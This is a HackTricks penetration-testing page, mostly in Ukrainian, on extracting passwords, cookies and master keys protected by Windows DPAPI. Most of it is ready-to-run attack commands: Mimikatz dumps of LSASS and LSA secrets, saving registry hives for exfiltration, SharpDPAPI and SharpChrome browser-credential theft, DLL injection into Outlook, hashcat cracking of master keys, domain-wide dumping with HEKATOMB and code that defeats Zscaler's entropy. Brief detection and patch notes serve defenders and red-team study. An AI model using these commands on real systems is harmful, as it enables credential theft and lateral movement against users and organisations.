# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## Що таке DPAPI

Data Protection API (DPAPI) використовується переважно в операційній системі Windows для **симетричного шифрування асиметричних приватних ключів**, використовуючи секрети користувача або системи як важливе джерело ентропії. Такий підхід спрощує шифрування для розробників, оскільки дає змогу шифрувати дані за допомогою ключа, отриманого із секретів входу користувача або, у випадку системного шифрування, секретів доменної автентифікації системи, усуваючи потребу розробників самостійно керувати захистом ключа шифрування.

Найпоширеніший спосіб використання DPAPI — через функції **`CryptProtectData` і `CryptUnprotectData`**, які дають змогу застосункам безпечно шифрувати та розшифровувати дані в межах сесії процесу, що наразі виконав вхід. Це означає, що зашифровані дані можуть бути розшифровані лише тим самим користувачем або системою, які їх зашифрували.

Крім того, ці функції також приймають параметр **`entropy`**, який використовується під час шифрування та розшифрування. Тому, щоб розшифрувати щось, зашифроване з використанням цього параметра, потрібно надати те саме значення entropy, яке використовувалося під час шифрування.

### Генерація ключа користувача

DPAPI генерує унікальний ключ (який називається **`pre-key`**) для кожного користувача на основі його облікових даних. Цей ключ отримується з пароля користувача та інших факторів, а алгоритм залежить від типу користувача, але зрештою результатом є SHA1. Наприклад, для доменних користувачів він **залежить від NTLM hash користувача**.

Це особливо цікаво, оскільки якщо attacker може отримати password hash користувача, він може:

- **Розшифрувати будь-які дані, зашифровані за допомогою DPAPI**, використовуючи ключ цього користувача та не звертаючись до жодного API
- Спробувати **зламати пароль** offline, намагаючись згенерувати дійсний ключ DPAPI

Крім того, щоразу, коли користувач шифрує певні дані за допомогою DPAPI, генерується новий **master key**. Саме цей master key фактично використовується для шифрування даних. Кожному master key призначається **GUID** (Globally Unique Identifier), який його ідентифікує.

Master keys зберігаються в каталозі **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, де `{SID}` — це Security Identifier цього користувача. Master key зберігається зашифрованим за допомогою **`pre-key`** користувача, а також **domain backup key** для відновлення (тобто той самий ключ зберігається зашифрованим 2 рази 2 різними паролями).

Зверніть увагу, що **domain key, який використовується для шифрування master key, знаходиться на domain controllers і ніколи не змінюється**, тому якщо attacker має доступ до domain controller, він може отримати domain backup key і розшифрувати master keys усіх користувачів у домені.<sup>[[2]](#references)</sup>

Зашифровані blobs містять **GUID master key**, який використовувався для шифрування даних, у своїх заголовках.

> [!TIP]
> Зашифровані DPAPI blobs починаються з **`01 00 00 00`**

Знайти master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Ось як виглядатиме набір Master Keys користувача:

![Що таке DPAPI — генерація ключів користувача: ось як виглядатиме набір Master Keys користувача](<../../images/image (1121).png>)

### Генерація ключів Machine/System

Це ключ, який використовується машиною для шифрування даних. Він базується на **DPAPI_SYSTEM LSA secret** — спеціальному ключі, доступ до якого має лише користувач SYSTEM. Цей ключ використовується для шифрування даних, які мають бути доступними самій системі, наприклад облікових даних рівня машини або загальносистемних секретів.<sup>[[2]](#references)</sup>

Зверніть увагу, що ці ключі **не мають резервної копії в домені**, тому доступні лише локально:

- **Mimikatz** може отримати до них доступ, виконавши dump LSA secrets за допомогою команди: `mimikatz lsadump::secrets`
- Секрет зберігається в registry, тому адміністратор може **змінити дозволи DACL для доступу до нього**. Шлях у registry: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Також можливе offline extraction із registry hives. Наприклад, маючи права адміністратора на цільовій системі, збережіть hives і exfiltrate їх:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Потім на вашій analysis box відновіть LSA secret DPAPI_SYSTEM із hives і використайте його для розшифрування blobs машинного рівня (паролів scheduled task, облікових даних служб, профілів Wi‑Fi тощо):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Дані, захищені DPAPI

До персональних даних, захищених DPAPI, належать:

- Облікові дані Windows
- Паролі та дані автозаповнення Internet Explorer і Google Chrome
- Паролі облікових записів електронної пошти та внутрішніх FTP для таких застосунків, як Outlook і Windows Mail
- Паролі для спільних папок, ресурсів, бездротових мереж і Windows Vault, включно з ключами шифрування
- Паролі для підключень до віддаленого робочого стола, .NET Passport і приватні ключі для різних цілей шифрування та автентифікації
- Мережеві паролі, якими керує Credential Manager, і персональні дані в застосунках, що використовують CryptProtectData, як-от Skype, MSN messenger та інші
- Зашифровані blobs у реєстрі
- ...

До системних захищених даних належать:
- Паролі Wi-Fi
- Паролі запланованих завдань
- ...

### Варіанти отримання master key

- Якщо користувач має привілеї domain admin, він може отримати доступ до **domain backup key**, щоб розшифрувати всі master keys користувачів у домені:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Маючи локальні права адміністратора, можна **отримати доступ до пам’яті LSASS**, щоб витягти головні ключі DPAPI усіх підключених користувачів і ключ SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Якщо користувач має локальні права адміністратора, він може отримати доступ до **DPAPI_SYSTEM LSA secret**, щоб розшифрувати машинні master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Якщо пароль або NTLM-хеш користувача відомий, ви можете **безпосередньо розшифрувати головні ключі користувача**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Якщо ви перебуваєте в сесії як цей користувач, можна запросити у DC **резервний ключ для розшифрування master keys за допомогою RPC**. Якщо ви є local admin, а користувач увійшов у систему, для цього можна **викрасти його session token**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Список Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Доступ до зашифрованих даних DPAPI

### Пошук зашифрованих даних DPAPI

Типові **захищені файли** користувачів знаходяться в:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Також перевірте заміну `\Roaming\` на `\Local\` у наведених вище шляхах.

Приклади перерахування:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) може знаходити зашифровані DPAPI blobs у файловій системі, реєстрі та B64 blobs:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Зверніть увагу, що [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (з того самого репозиторію) можна використовувати для розшифрування за допомогою DPAPI таких чутливих даних, як cookies.<sup>[[12]](#references)</sup>

#### Швидкі рецепти Chromium/Edge/Electron (SharpChrome)

- Поточний користувач, інтерактивне розшифрування збережених логінів/cookies (працює навіть із app-bound cookies у Chrome 127+, оскільки додатковий ключ отримується з Credential Manager користувача під час запуску в контексті користувача):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline аналіз, коли у вас є лише файли. Спочатку витягніть ключ стану AES із "Local State" профілю, а потім використайте його для розшифрування cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domain-wide/віддалений triage, коли у вас є резервний ключ домену DPAPI (PVK) і admin на цільовому хості:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Якщо у вас є DPAPI prekey/credkey користувача (отриманий із LSASS), можна пропустити підбір пароля та безпосередньо розшифрувати дані профілю:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Примітки
- Новіші збірки Chrome/Edge можуть зберігати певні cookies, використовуючи шифрування "App-Bound". Офлайн-розшифрування цих конкретних cookies неможливе без додаткового app-bound ключа; запустіть SharpChrome у контексті цільового користувача, щоб автоматично отримати його. Дивіться публікацію в блозі про безпеку Chrome, згадану нижче.<sup>[[5]](#references)</sup>

### Ключі доступу та дані

- **Використовуйте SharpDPAPI**, щоб отримати облікові дані з зашифрованих DPAPI файлів поточного сеансу:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Отримайте інформацію про облікові дані** — наприклад, зашифровані дані та guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Розшифрувати masterkey користувача, який запитує **domain backup key**, за допомогою RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Інструмент **SharpDPAPI** також підтримує ці аргументи для розшифрування masterkey (зверніть увагу, що можна використовувати `/rpc`, щоб отримати резервний ключ домену, `/password`, щоб використати пароль у відкритому вигляді, або `/pvk`, щоб указати файл приватного ключа домену DPAPI...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Розшифрувати дані за допомогою masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Інструмент **SharpDPAPI** також підтримує ці аргументи для розшифрування `credentials|vaults|rdg|keepass|triage|blob|ps` (зверніть увагу, що можна використовувати `/rpc`, щоб отримати резервний ключ домену, `/password`, щоб використати звичайний текстовий пароль, `/pvk`, щоб вказати файл із приватним ключем домену DPAPI, `/unprotect`, щоб використати сеанс поточного користувача...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Використання DPAPI prekey/credkey безпосередньо (пароль не потрібен)

Якщо ви можете зробити dump LSASS, Mimikatz часто надає DPAPI-ключ для кожного сеансу входу, який можна використати для розшифрування masterkeys користувача без знання пароля у відкритому вигляді. Передайте це значення безпосередньо інструментам:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Розшифрувати певні дані за допомогою **поточного сеансу користувача**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Offline decryption with Impacket dpapi.py

Якщо у вас є SID і пароль користувача-жертви (або NT hash), ви можете повністю розшифрувати DPAPI masterkeys і Credential Manager blobs офлайн за допомогою Impacket’s dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Визначте артефакти на диску:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Відповідний masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Якщо інструменти передачі файлів працюють нестабільно, закодуйте файли в base64 на хості та скопіюйте вивід:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Розшифрувати masterkey за допомогою SID і пароля/хешу користувача:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Використайте розшифрований masterkey, щоб розшифрувати credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Цей workflow часто відновлює доменні облікові дані, збережені застосунками за допомогою Windows Credential Manager, включно з адміністративними обліковими записами (наприклад, `*_adm`).

---

### Обробка додаткової ентропії ("Third-party entropy")

Деякі застосунки передають додаткове значення **ентропії** до `CryptProtectData`. Без цього значення blob неможливо розшифрувати, навіть якщо правильний masterkey відомий. Тому отримання ентропії є необхідним під час роботи з обліковими даними, захищеними таким способом (наприклад, Microsoft Outlook і деякі VPN-клієнти).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) — це DLL у user-mode, яка перехоплює функції DPAPI всередині цільового процесу та прозоро записує будь-яку передану optional entropy. Запуск EntropyCapture у режимі **DLL-injection** проти таких процесів, як `outlook.exe` або `vpnclient.exe`, створить файл, що зіставляє кожен entropy buffer із процесом-викликачем і blob. Надалі захоплену ентропію можна передати до **SharpDPAPI** (`/entropy:`) або **Mimikatz** (`/entropy:<file>`), щоб розшифрувати дані.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Offline-крэкінг masterkeys (Hashcat і DPAPISnoop)

Microsoft представила формат masterkey **context 3**, починаючи з Windows 10 v1607 (2016). `hashcat` v6.2.6 (грудень 2023 року) додав hash-моди **22100** (DPAPI masterkey v1 context), **22101** (context 1) і **22102** (context 3), що дають змогу виконувати GPU-прискорений крекінг паролів користувачів безпосередньо з файлу masterkey. Таким чином, Attackers можуть виконувати атаки за словником або brute-force-атаки без взаємодії з цільовою системою.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) автоматизує цей процес:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Інструмент також може аналізувати Credential і Vault blobs, розшифровувати їх за допомогою зламаних ключів і експортувати паролі у відкритому вигляді.<sup>[[8]](#references)</sup>


### Доступ до даних іншої машини

У **SharpDPAPI та SharpChrome** можна вказати опцію **`/server:HOST`**, щоб отримати доступ до даних віддаленої машини. Звичайно, потрібно мати доступ до цієї машини, а в наведеному нижче прикладі передбачається, що **ключ шифрування резервної копії домену відомий**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Інші інструменти

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) — це інструмент, який автоматизує extraction усіх користувачів і комп'ютерів із LDAP directory, а також extraction backup key доменного контролера через RPC. Потім скрипт визначає IP-адреси всіх комп'ютерів і виконує smbclient на кожному з них, щоб отримати всі DPAPI blobs усіх користувачів і розшифрувати все за допомогою domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

За допомогою списку комп'ютерів, отриманого з LDAP, можна знайти кожну підмережу, навіть якщо ви не знали про її існування!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) може автоматично dump-ити secrets, захищені DPAPI. У релізі 2.x представлено:<sup>[[9]](#references)</sup>

* Parallel collection blobs із сотень hosts
* Parsing **context 3** masterkeys та автоматична інтеграція з Hashcat для cracking
* Підтримка зашифрованих cookies Chrome "App-Bound" (див. наступний розділ)
* Новий режим **`--snapshot`** для повторного опитування endpoints і виявлення нових blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) — це C# parser для файлів masterkey/credential/vault, який може виводити формати Hashcat/JtR і, за потреби, автоматично запускати cracking. Він повністю підтримує формати machine і user masterkey аж до Windows 11 24H1.<sup>[[8]](#references)</sup>


## Поширені виявлення

- Доступ до файлів у `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` та інших каталогах, пов'язаних із DPAPI.
- Особливо через network share, як-от **C$** або **ADMIN$**.
- Використання **Mimikatz**, **SharpDPAPI** або подібних інструментів для доступу до пам'яті LSASS чи dump-у masterkeys.
- Подія **4662**: *Виконано операцію над об'єктом* — може бути зіставлена з доступом до об'єкта **`BCKUPKEY`**.
- Події **4673/4674**, коли процес запитує *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Уразливості та зміни екосистеми 2023–2025 років

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (листопад 2023 року). Зловмисник із доступом до мережі міг обманом змусити domain member отримати шкідливий DPAPI backup key, що дозволяло розшифрувати user masterkeys. Уразливість виправлено в сукупному оновленні за листопад 2023 року — адміністраторам слід переконатися, що DC та workstations повністю оновлені.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (липень 2024 року) замінило legacy DPAPI-only protection додатковим key, що зберігається в **Credential Manager** користувача. Offline decryption cookies тепер потребує і DPAPI masterkey, і **GCM-wrapped app-bound key**. SharpChrome v2.3 та DonPAPI 2.x можуть отримати додатковий key під час виконання в user context.<sup>[[5]](#references)</sup>


### Практичний приклад: Zscaler Client Connector – Custom Entropy, отримана з SID

Zscaler Client Connector зберігає кілька configuration files у `C:\ProgramData\Zscaler` (наприклад, `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Кожен файл зашифровано за допомогою **DPAPI (Machine scope)**, але vendor надає **custom entropy**, яка *обчислюється під час виконання*, а не зберігається на диску.<sup>[[1]](#references)</sup>

Entropy відновлюється з двох елементів:

1. Hard-coded secret, вбудованого в `ZSACredentialProvider.dll`.
2. **SID** Windows account, якому належить configuration.

Алгоритм, реалізований DLL, еквівалентний такому:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Оскільки секрет вбудовано в DLL, яку можна прочитати з диска, **будь-який локальний attacker із правами SYSTEM може повторно згенерувати entropy для будь-якого SID** і розшифрувати blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Розшифрування повертає повну конфігурацію JSON, зокрема всі **device posture check** та їхні очікувані значення — ця інформація дуже цінна під час спроб обійти перевірки на стороні клієнта.

> ПОРАДА: інші зашифровані артефакти (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) захищені за допомогою DPAPI **без entropy** (`16` нульових байтів). Тому їх можна розшифрувати безпосередньо за допомогою `ProtectedData.Unprotect` після отримання привілеїв SYSTEM.

## Посилання

- [1] [Synacktiv – Чи варто довіряти вашому zero trust? Обхід перевірок Zscaler posture](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Секрети DPAPI. Аналіз безпеки та відновлення даних у DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Читання зашифрованих DPAPI секретів за допомогою Mimikatz і C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 — вразливість підміни Windows DPAPI (Data Protection Application Programming Interface)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Підвищення безпеки cookie Chrome у Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: просте вилучення додаткової entropy DPAPI](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Примітки до випуску hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop — репозиторій GitHub](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 — сторінка проєкту PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket — dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: зловживання AD ACL, cracking Argon2 KeePassXC та розшифрування DPAPI до отримання прав адміністратора DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome — використання та параметри](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
